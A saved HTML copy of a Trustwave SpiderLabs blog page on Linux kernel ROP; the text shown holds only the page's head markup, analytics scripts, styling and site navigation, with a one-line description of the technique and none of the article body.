<!DOCTYPE html>
<!-- saved from url=(0108)https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/ -->
<html class="js sizes customelements history postmessage websockets picture webworkers pointerevents webgl srcset cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox" lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/js"></script><script type="text/javascript" async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/analytics.js.下載"></script><script async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/fbevents.js.下載"></script><script type="text/javascript" async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/insight.min.js.下載"></script><script type="text/javascript" async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/f.txt"></script><script type="text/javascript" async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/uwt.js.下載"></script><script type="text/javascript" async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/insight.min.js.下載"></script><script type="text/javascript" async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/analytics.js.下載"></script><script type="text/javascript" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/1.txt"></script><script type="text/javascript" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/1(1).txt"></script><script type="text/javascript" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/moatframe.js.下載"></script>


<script type="text/javascript" async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/recaptcha__zh_tw.js.下載" crossorigin="anonymous" integrity="sha384-hR3VRaqfxKhcqcNEbDZ8Pxj7CCkilFkn9ncTAW+JsyYR9gpOPsTcFdzSznYj1sSs"></script><script type="text/javascript" async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/recaptcha__zh_tw.js.下載" crossorigin="anonymous" integrity="sha384-hR3VRaqfxKhcqcNEbDZ8Pxj7CCkilFkn9ncTAW+JsyYR9gpOPsTcFdzSznYj1sSs"></script><script async="" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/gtm.js.下載"></script><script>
    (function (w, d, s, l, i) {
        w[l] = w[l] || []; w[l].push({
            'gtm.start':
                new Date().getTime(), event: 'gtm.js'
        }); var f = d.getElementsByTagName(s)[0],
            j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
    })(window, document, 'script', 'dataLayer', 'GTM-54M2ZJN');</script>

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<meta name="rights" content="© Copyright Trustwave 2021">
<link rel="apple-touch-icon" sizes="57x57" href="https://www.trustwave.com/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="https://www.trustwave.com/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="https://www.trustwave.com/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="https://www.trustwave.com/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="https://www.trustwave.com/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="https://www.trustwave.com/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="https://www.trustwave.com/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="https://www.trustwave.com/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://www.trustwave.com/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192" href="https://www.trustwave.com/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://www.trustwave.com/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="https://www.trustwave.com/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://www.trustwave.com/favicon-16x16.png">
<link rel="manifest" href="https://www.trustwave.com/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
<meta name="theme-color" content="#ed1a3d">
<meta name="msvalidate.01" content="B5B6397DC5AEABDCC2BD2A5D1872960D">
<title>Linux Kernel ROP - Ropping your way to # (Part 1) | Trustwave | SpiderLabs | Trustwave</title>
<meta name="description" content="Kernel ROP In-kernel ROP (Return Oriented Programming) is a useful technique that is often used to bypass restrictions associated with non-executable memory regions. For example, on default kernels1, it presents a practical approach for bypassing kernel and user address separation...">

<link rel="alternate" href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/" hreflang="x-default">

    <link rel="canonical" href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/">
    <meta property="og:url" content="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/">
<meta property="og:type" content="website">
<meta property="og:site_name" content="Trustwave">
    <meta property="og:image" content="https://trustwave.azureedge.net/media/15281/generic-default-image.jpg?rnd=131897043920000000">
<meta property="og:title" content="Linux Kernel ROP - Ropping your way to # (Part 1)">
<meta property="og:description" content="Kernel ROP In-kernel ROP (Return Oriented Programming) is a useful technique that is often used to bypass restrictions associated with non-executable memory regions. For example, on default kernels1, it presents a practical approach for bypassing kernel and user address separation...">

<!-- CSS & JS -->
        <link type="text/css" rel="stylesheet" href="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/9c85e15b-99ed-40a4-929d-2262f9ed2706.css">
        <link rel="stylesheet" type="text/css" href="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/legacy.min.css">
        <link rel="stylesheet" type="text/css" href="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/styles.min.css">
        <link rel="stylesheet" type="text/css" href="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/feather.css">




<!--[if lt IE 9]>
  <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
  <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
<![endif]-->
<script type="text/javascript">
    var appInsights = window.appInsights || function (config) {
        function r(config) { t[config] = function () { var i = arguments; t.queue.push(function () { t[config].apply(t, i) }) } }
        var t = { config: config }, u = document, e = window, o = 'script', s = u.createElement(o), i, f; for (s.src = config.url || '//az416426.vo.msecnd.net/scripts/a/ai.0.js', u.getElementsByTagName(o)[0].parentNode.appendChild(s), t.cookie = u.cookie, t.queue = [], i = ['Event', 'Exception', 'Metric', 'PageView', 'Trace', 'Ajax']; i.length;)r('track' + i.pop()); return r('setAuthenticatedUserContext'), r('clearAuthenticatedUserContext'), config.disableExceptionTracking || (i = 'onerror', r('_' + i), f = e[i], e[i] = function (config, r, u, e, o) { var s = f && f(config, r, u, e, o); return s !== !0 && t['_' + i](config, r, u, e, o), s }), t
    }({
        instrumentationKey: "d8139253-6e32-4606-9657-fe02425cfe56"
    });

    window.appInsights = appInsights;
    appInsights.trackPageView();
</script><script src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/ai.0.js.下載"></script>
<script src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/api.js.下載"></script>
<script src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/api.js(1).下載"></script>

            <link rel="amphtml" href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/?amp=1">


    <script>
var SThreshold = 0.5;var globalmktoid = 0;var globalpartnerform = false;var globalfooterform = true;

    </script>

<style type="text/css">.at-icon{fill:#fff;border:0}.at-icon-wrapper{display:inline-block;overflow:hidden}a .at-icon-wrapper{cursor:pointer}.at-rounded,.at-rounded-element .at-icon-wrapper{border-radius:12%}.at-circular,.at-circular-element .at-icon-wrapper{border-radius:50%}.addthis_32x32_style .at-icon{width:2pc;height:2pc}.addthis_24x24_style .at-icon{width:24px;height:24px}.addthis_20x20_style .at-icon{width:20px;height:20px}.addthis_16x16_style .at-icon{width:1pc;height:1pc}#at16lb{display:none;position:absolute;top:0;left:0;width:100%;height:100%;z-index:1001;background-color:#000;opacity:.001}#at_complete,#at_error,#at_share,#at_success{position:static!important}.at15dn{display:none}#at15s,#at16p,#at16p form input,#at16p label,#at16p textarea,#at_share .at_item{font-family:arial,helvetica,tahoma,verdana,sans-serif!important;font-size:9pt!important;outline-style:none;outline-width:0;line-height:1em}* html #at15s.mmborder{position:absolute!important}#at15s.mmborder{position:fixed!important;width:250px!important}#at15s{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABtJREFUeNpiZGBgaGAgAjAxEAlGFVJHIUCAAQDcngCUgqGMqwAAAABJRU5ErkJggg==);float:none;line-height:1em;margin:0;overflow:visible;padding:5px;text-align:left;position:absolute}#at15s a,#at15s span{outline:0;direction:ltr;text-transform:none}#at15s .at-label{margin-left:5px}#at15s .at-icon-wrapper{width:1pc;height:1pc;vertical-align:middle}#at15s .at-icon{width:1pc;height:1pc}.at4-icon{display:inline-block;background-repeat:no-repeat;background-position:top left;margin:0;overflow:hidden;cursor:pointer}.addthis_16x16_style .at4-icon,.addthis_default_style .at4-icon,.at4-icon,.at-16x16{width:1pc;height:1pc;line-height:1pc;background-size:1pc!important}.addthis_32x32_style .at4-icon,.at-32x32{width:2pc;height:2pc;line-height:2pc;background-size:2pc!important}.addthis_24x24_style .at4-icon,.at-24x24{width:24px;height:24px;line-height:24px;background-size:24px!important}.addthis_20x20_style .at4-icon,.at-20x20{width:20px;height:20px;line-height:20px;background-size:20px!important}.at4-icon.circular,.circular .at4-icon,.circular.aticon{border-radius:50%}.at4-icon.rounded,.rounded .at4-icon{border-radius:4px}.at4-icon-left{float:left}#at15s .at4-icon{text-indent:20px;padding:0;overflow:visible;white-space:nowrap;background-size:1pc;width:1pc;height:1pc;background-position:top left;display:inline-block;line-height:1pc}.addthis_vertical_style .at4-icon,.at4-follow-container .at4-icon{margin-right:5px}html>body #at15s{width:250px!important}#at15s.atm{background:none!important;padding:0!important;width:10pc!important}#at15s_inner{background:#fff;border:1px solid #fff;margin:0}#at15s_head{position:relative;background:#f2f2f2;padding:4px;cursor:default;border-bottom:1px solid #e5e5e5}.at15s_head_success{background:#cafd99!important;border-bottom:1px solid #a9d582!important}.at15s_head_success a,.at15s_head_success span{color:#000!important;text-decoration:none}#at15s_brand,#at15sptx,#at16_brand{position:absolute}#at15s_brand{top:4px;right:4px}.at15s_brandx{right:20px!important}a#at15sptx{top:4px;right:4px;text-decoration:none;color:#4c4c4c;font-weight:700}#at15sptx:hover{text-decoration:underline}#at16_brand{top:5px;right:30px;cursor:default}#at_hover{padding:4px}#at_hover .at_item,#at_share .at_item{background:#fff!important;float:left!important;color:#4c4c4c!important}#at_share .at_item .at-icon-wrapper{margin-right:5px}#at_hover .at_bold{font-weight:700;color:#000!important}#at_hover .at_item{width:7pc!important;padding:2px 3px!important;margin:1px;text-decoration:none!important}#at_hover .at_item.athov,#at_hover .at_item:focus,#at_hover .at_item:hover{margin:0!important}#at_hover .at_item.athov,#at_hover .at_item:focus,#at_hover .at_item:hover,#at_share .at_item.athov,#at_share .at_item:hover{background:#f2f2f2!important;border:1px solid #e5e5e5;color:#000!important;text-decoration:none}.ipad #at_hover .at_item:focus{background:#fff!important;border:1px solid #fff}.at15t{display:block!important;height:1pc!important;line-height:1pc!important;padding-left:20px!important;background-position:0 0;text-align:left}.addthis_button,.at15t{cursor:pointer}.addthis_toolbox a.at300b,.addthis_toolbox a.at300m{width:auto}.addthis_toolbox a{margin-bottom:5px;line-height:initial}.addthis_toolbox.addthis_vertical_style{width:200px}.addthis_button_facebook_like .fb_iframe_widget{line-height:100%}.addthis_button_facebook_like iframe.fb_iframe_widget_lift{max-width:none}.addthis_toolbox a.addthis_button_counter,.addthis_toolbox a.addthis_button_facebook_like,.addthis_toolbox a.addthis_button_facebook_send,.addthis_toolbox a.addthis_button_facebook_share,.addthis_toolbox a.addthis_button_foursquare,.addthis_toolbox a.addthis_button_linkedin_counter,.addthis_toolbox a.addthis_button_pinterest_pinit,.addthis_toolbox a.addthis_button_tweet{display:inline-block}.addthis_toolbox span.addthis_follow_label{display:none}.addthis_toolbox.addthis_vertical_style span.addthis_follow_label{display:block;white-space:nowrap}.addthis_toolbox.addthis_vertical_style a{display:block}.addthis_toolbox.addthis_vertical_style.addthis_32x32_style a{line-height:2pc;height:2pc}.addthis_toolbox.addthis_vertical_style .at300bs{margin-right:4px;float:left}.addthis_toolbox.addthis_20x20_style span{line-height:20px}.addthis_toolbox.addthis_32x32_style span{line-height:2pc}.addthis_toolbox.addthis_pill_combo_style .addthis_button_compact .at15t_compact,.addthis_toolbox.addthis_pill_combo_style a{float:left}.addthis_toolbox.addthis_pill_combo_style a.addthis_button_tweet{margin-top:-2px}.addthis_toolbox.addthis_pill_combo_style .addthis_button_compact .at15t_compact{margin-right:4px}.addthis_default_style .addthis_separator{margin:0 5px;display:inline}div.atclear{clear:both}.addthis_default_style .addthis_separator,.addthis_default_style .at4-icon,.addthis_default_style .at300b,.addthis_default_style .at300bo,.addthis_default_style .at300bs,.addthis_default_style .at300m{float:left}.at300b img,.at300bo img{border:0}a.at300b .at4-icon,a.at300m .at4-icon{display:block}.addthis_default_style .at300b,.addthis_default_style .at300bo,.addthis_default_style .at300m{padding:0 2px}.at300b,.at300bo,.at300bs,.at300m{cursor:pointer}.addthis_button_facebook_like.at300b:hover,.addthis_button_facebook_like.at300bs:hover,.addthis_button_facebook_send.at300b:hover,.addthis_button_facebook_send.at300bs:hover{opacity:1}.addthis_20x20_style .at15t,.addthis_20x20_style .at300bs{overflow:hidden;display:block;height:20px!important;width:20px!important;line-height:20px!important}.addthis_32x32_style .at15t,.addthis_32x32_style .at300bs{overflow:hidden;display:block;height:2pc!important;width:2pc!important;line-height:2pc!important}.at300bs{overflow:hidden;display:block;background-position:0 0;height:1pc;width:1pc;line-height:1pc!important}.addthis_default_style .at15t_compact,.addthis_default_style .at15t_expanded{margin-right:4px}#at_share .at_item{width:123px!important;padding:4px;margin-right:2px;border:1px solid #fff}#at16p{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABtJREFUeNpiZGBgaGAgAjAxEAlGFVJHIUCAAQDcngCUgqGMqwAAAABJRU5ErkJggg==);z-index:10000001;position:absolute;top:50%;left:50%;width:300px;padding:10px;margin:0 auto;margin-top:-185px;margin-left:-155px;font-family:arial,helvetica,tahoma,verdana,sans-serif;font-size:9pt;color:#5e5e5e}#at_share{margin:0;padding:0}#at16pt{position:relative;background:#f2f2f2;height:13px;padding:5px 10px}#at16pt a,#at16pt h4{font-weight:700}#at16pt h4{display:inline;margin:0;padding:0;font-size:9pt;color:#4c4c4c;cursor:default}#at16pt a{position:absolute;top:5px;right:10px;color:#4c4c4c;text-decoration:none;padding:2px}#at15sptx:focus,#at16pt a:focus{outline:thin dotted}#at15s #at16pf a{top:1px}#_atssh{width:1px!important;height:1px!important;border:0!important}.atm{width:10pc!important;padding:0;margin:0;line-height:9pt;letter-spacing:normal;font-family:arial,helvetica,tahoma,verdana,sans-serif;font-size:9pt;color:#444;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABtJREFUeNpiZGBgaGAgAjAxEAlGFVJHIUCAAQDcngCUgqGMqwAAAABJRU5ErkJggg==);padding:4px}.atm-f{text-align:right;border-top:1px solid #ddd;padding:5px 8px}.atm-i{background:#fff;border:1px solid #d5d6d6;padding:0;margin:0;box-shadow:1px 1px 5px rgba(0,0,0,.15)}.atm-s{margin:0!important;padding:0!important}.atm-s a:focus{border:transparent;outline:0;transition:none}#at_hover.atm-s a,.atm-s a{display:block;text-decoration:none;padding:4px 10px;color:#235dab!important;font-weight:400;font-style:normal;transition:none}#at_hover.atm-s .at_bold{color:#235dab!important}#at_hover.atm-s a:hover,.atm-s a:hover{background:#2095f0;text-decoration:none;color:#fff!important}#at_hover.atm-s .at_bold{font-weight:700}#at_hover.atm-s a:hover .at_bold{color:#fff!important}.atm-s a .at-label{vertical-align:middle;margin-left:5px;direction:ltr}.at_PinItButton{display:block;width:40px;height:20px;padding:0;margin:0;background-image:url(//s7.addthis.com/static/t00/pinit00.png);background-repeat:no-repeat}.at_PinItButton:hover{background-position:0 -20px}.addthis_toolbox .addthis_button_pinterest_pinit{position:relative}.at-share-tbx-element .fb_iframe_widget span{vertical-align:baseline!important}#at16pf{height:auto;text-align:right;padding:4px 8px}.at-privacy-info{position:absolute;left:7px;bottom:7px;cursor:pointer;text-decoration:none;font-family:helvetica,arial,sans-serif;font-size:10px;line-height:9pt;letter-spacing:.2px;color:#666}.at-privacy-info:hover{color:#000}.body .wsb-social-share .wsb-social-share-button-vert{padding-top:0;padding-bottom:0}.body .wsb-social-share.addthis_counter_style .addthis_button_tweet.wsb-social-share-button{padding-top:40px}.body .wsb-social-share.addthis_counter_style .addthis_button_facebook_like.wsb-social-share-button{padding-top:21px}@media print{#at4-follow,#at4-share,#at4-thankyou,#at4-whatsnext,#at4m-mobile,#at15s,.at4,.at4-recommended{display:none!important}}@media screen and (max-width:400px){.at4win{width:100%}}@media screen and (max-height:700px) and (max-width:400px){.at4-thankyou-inner .at4-recommended-container{height:122px;overflow:hidden}.at4-thankyou-inner .at4-recommended .at4-recommended-item:first-child{border-bottom:1px solid #c5c5c5}}</style><style type="text/css">.at-branding-logo{font-family:helvetica,arial,sans-serif;text-decoration:none;font-size:10px;display:inline-block;margin:2px 0;letter-spacing:.2px}.at-branding-logo .at-branding-icon{background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAMAAAC67D+PAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAAZQTFRF////+GlNUkcc1QAAAB1JREFUeNpiYIQDBjQmAwMmkwEM0JnY1WIxFyDAABGeAFEudiZsAAAAAElFTkSuQmCC")}.at-branding-logo .at-branding-icon,.at-branding-logo .at-privacy-icon{display:inline-block;height:10px;width:10px;margin-left:4px;margin-right:3px;margin-bottom:-1px;background-repeat:no-repeat}.at-branding-logo .at-privacy-icon{background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAKCAMAAABR24SMAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAABhQTFRF8fr9ot/xXcfn2/P5AKva////////AKTWodjhjAAAAAd0Uk5T////////ABpLA0YAAAA6SURBVHjaJMzBDQAwCAJAQaj7b9xifV0kUKJ9ciWxlzWEWI5gMF65KUTv0VKkjVeTerqE/x7+9BVgAEXbAWI8QDcfAAAAAElFTkSuQmCC")}.at-branding-logo span{text-decoration:none}.at-branding-logo .at-branding-addthis,.at-branding-logo .at-branding-powered-by{color:#666}.at-branding-logo .at-branding-addthis:hover{color:#333}.at-cv-with-image .at-branding-addthis,.at-cv-with-image .at-branding-addthis:hover{color:#fff}a.at-branding-logo:visited{color:initial}.at-branding-info{display:inline-block;padding:0 5px;color:#666;border:1px solid #666;border-radius:50%;font-size:10px;line-height:9pt;opacity:.7;transition:all .3s ease;text-decoration:none}.at-branding-info span{border:0;clip:rect(0 0 0 0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.at-branding-info:before{content:'i';font-family:Times New Roman}.at-branding-info:hover{color:#0780df;border-color:#0780df}</style><script src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/d22d5d9f-dee9-4eea-bf38-6b6ef609199b.js.下載" charset="utf-8" async=""></script><meta http-equiv="origin-trial" content="A3v9QjmVUCOO7YqFMKHP/NKbn6kY1G1pa2S1TfeXJZUD/tysMONTy6lV0Jkou3rrCjSKRGbqTrgTaZkm1XJ7pQUAAACKeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ21hbmFnZXIuY29tOjQ0MyIsImZlYXR1cmUiOiJDb252ZXJzaW9uTWVhc3VyZW1lbnQiLCJleHBpcnkiOjE2NDMxNTUxOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><link type="text/css" href="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/optanon.css" rel="stylesheet"><style>#optanon ul#optanon-menu li { background-color: #FFFFFF !important }#optanon ul#optanon-menu li.menu-item-selected { background-color: #FFFFFF !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #ED1A3D !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #ED1A3D !important; border-color: #ED1A3D !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #FFFFFF !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #FFFFFF !important }.optanon-alert-box-wrapper { background-color:#000000 !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color:#FFFFFF !important }.banner-policy-link{
color:white!important;
outline : none !important;
}

div#optanon-popup-bottom-logo
{
display:none!important;
}

#optanon #optanon-popup-body-left
{
width:28% !important;
}

#optanon #optanon-popup-body-right
{
width: 60% !important;
}

#optanon #optanon-menu li .preference-menu-item button, #optanon #optanon-menu li .preference-menu-item a
{
font-size:10px!important;
}
#optanon, #optanon *, #optanon div, #optanon span, #optanon ul, #optanon li, #optanon a, #optanon p, .optanon-alert-box-wrapper *
{
font-family: inherit !important;
}

#optanon #optanon-popup-body p, #optanon #optanon-popup-body div.optanon-main-info-text
{
font-size: 12px !important;
}

#optanon #optanon-popup-bottom
{
border-top: none !important;
}

.optanon-alert-box-wrapper .optanon-button-allow .optanon-alert-box-button-middle button:before
{
display:none!important;
}
.optanon-alert-box-wrapper
{
background-color:rgba(0,0,0,0.85)!important;
}</style><script src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/f(1).txt"></script></head>
<body class="site-wrapper site-header-transition">

    <!--[if lte IE 9]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
    <![endif]-->
    <!-- Google Tag Manager (noscript) -->
    <noscript>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-54M2ZJN"
                height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript>
    <!-- End Google Tag Manager (noscript) -->



<header class="site-header site-header-modifier-singtel">
    <!-- .site-header-dark | .site-header-fill | .site-header-shrink | .site-header-active -->
    <div class="site-header-backdrop"></div>



    <div class="site-header-wrap site-header-wrap-basic">
        <div class="site-header-brand-wrap">
            <div class="site-header-brand" style="width: 222px;">
                <a href="https://www.trustwave.com/en-us/" class="site-header-logo">
                    <span style="background-image: url(https://trustwave.azureedge.net/dist/svg/logos/trustwave/trustwave-logo-white.svg);"></span>
                    <img src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/trustwave-logo-color.svg" alt="Trustwave">
                </a>
            </div>
            <div class="site-header-toggle-wrap">
                <button class="site-header-open-btn"><i class="fe fe-menu"></i></button>
            </div>
        </div>
    </div>
    <div class="site-header-wrap site-header-wrap-main site-header-wrap-fixed">
        <div class="site-header-container fill-on-scroll shrink">
            <!-- .site-header-container-fluid -->
            <div class="site-header-brand-wrap">
                <div class="site-header-brand" style="width: 222px;">
                    <a href="https://www.trustwave.com/en-us/" class="site-header-logo">
                        <span style="background-image: url(https://trustwave.azureedge.net/dist/svg/logos/trustwave/trustwave-logo-white.svg);"></span>
                        <img src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/trustwave-logo-color.svg" alt="Trustwave">
                    </a>
                </div>
                <div class="site-header-toggle-wrap">
                    <button class="site-header-close-btn"><i class="fe fe-x"></i></button>
                </div>
            </div>
            <div class="site-header-nav-wrap">
                <div class="site-header-nav-content">
                    <nav class="site-header-nav site-header-nav-primary site-header-nav-center">
                        <ul>
                            <li>
                                <button class="site-header-nav-control site-header-nav-btn">Services</button>
                                <div class="site-header-subnav-wrap">
                                    <button class="site-header-back-btn"><i class="fe fe-arrow-left me-4"></i> Services</button>
                                    <nav class="site-header-subnav" data-subnav-width="800px" data-subnav-offset="-224px" id="tw-subnav-services">
                                        <div class="border-bottom p-4 p-xl-7 overflow-hidden">
                                            <ul class="list-unstyled row row-cols-1 row-cols-xl-2 gy-4 gy-xl-6">
                                                <li class="col d-flex align-items-start">
                                                    <div class="d-none d-xl-block me-4">
                                                        <i class="twi twi-radar icon-lg"></i>
                                                    </div>
                                                    <a href="https://www.trustwave.com/en-us/services/managed-detection-and-response/" title="Managed Detection and Response (MDR)" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="managed-detection-and-response" data-ga-value="1">
                                                        Managed Detection &amp; Response
                                                        <span class="d-block small text-muted">Eradicate cyberthreats with world-class intel and expertise</span>
                                                    </a>
                                                </li>
                                                <li class="col d-flex align-items-start">
                                                    <div class="d-none d-xl-block me-4">
                                                        <i class="twi twi-cloud-lock icon-lg"></i>
                                                    </div>
                                                    <a href="https://www.trustwave.com/en-us/services/managed-security-services/" title="Managed Security Services (MSS)" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="managed-security-services" data-ga-value="1">
                                                        Managed Security Services
                                                        <span class="d-block small text-muted">Expand your team’s capabilities and strengthen your security posture</span>
                                                    </a>
                                                </li>
                                                <li class="col d-flex align-items-start">
                                                    <div class="d-none d-xl-block me-4">
                                                        <i class="twi twi-briefcase icon-lg"></i>
                                                    </div>
                                                    <a href="https://www.trustwave.com/en-us/services/consulting-and-professional-services/" title="Consulting and Professional Services (CPS)" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="consulting-and-professional-services" data-ga-value="1">
                                                        Consulting &amp; Professional Services
                                                        <span class="d-block small text-muted">Tap into our global team of tenured cybersecurity specialists</span>
                                                    </a>
                                                </li>
                                                <li class="col d-flex align-items-start">
                                                    <div class="d-none d-xl-block me-4">
                                                        <i class="twi twi-dashboard icon-lg"></i>
                                                    </div>
                                                    <a href="https://www.trustwave.com/en-us/services/penetration-testing/" title="Pentesting and Vulnerability Scanning" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="penetration-testing" data-ga-value="1">
                                                        Penetration Testing
                                                        <span class="d-block small text-muted">Subscription- or project-based testing, delivered by global experts</span>
                                                    </a>
                                                </li>
                                                <li class="col d-flex align-items-start">
                                                    <div class="d-none d-xl-block me-4">
                                                        <i class="twi twi-database icon-lg"></i>
                                                    </div>
                                                    <a href="https://www.trustwave.com/en-us/services/database-security/" title="Database Security" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="database-security" data-ga-value="1">
                                                        Database Security
                                                        <span class="d-block small text-muted">Get ahead of database risk, protect data and exceed compliance requirements</span>
                                                    </a>
                                                </li>
                                                <li class="col d-flex align-items-start">
                                                    <div class="d-none d-xl-block me-4">
                                                        <i class="twi twi-email icon-lg"></i>
                                                    </div>
                                                    <a href="https://www.trustwave.com/en-us/services/email-security/" title="Email Security" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="email-security" data-ga-value="1">
                                                        Email Security
                                                        <span class="d-block small text-muted">Catch email threats others miss and prevent data loss</span>
                                                    </a>
                                                </li>
                                            </ul>
                                        </div>
                                        <div class="p-4 text-xl-center">
                                            <a href="https://www.trustwave.com/en-us/services/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="view-all-services" data-ga-value="1">View All Trustwave Services</a>
                                        </div>
                                    </nav>
                                </div>
                            </li>
                            <li>
                                <button class="site-header-nav-control site-header-nav-btn">Solutions</button>
                                <div class="site-header-subnav-wrap">
                                    <button class="site-header-back-btn"><i class="fe fe-arrow-left me-4"></i> Solutions</button>
                                    <nav class="site-header-subnav" id="tw-subnav-solutions">
                                        <div class="p-xl-7 overflow-hidden">
                                            <div class="row">
                                                <div class="col-xl-7">
                                                    <div class="p-4 p-xl-0 mb-xl-7 border-bottom border-xl-bottom-0">
                                                        <h6 class="border-xl-bottom pb-xl-2">By Industry</h6>
                                                        <ul class="list-unstyled row row-cols-1 row-cols-xl-3 gy-3">
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-industry/education/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="education" data-ga-value="1">Education</a>
                                                            </li>
                                                            <li class="col">
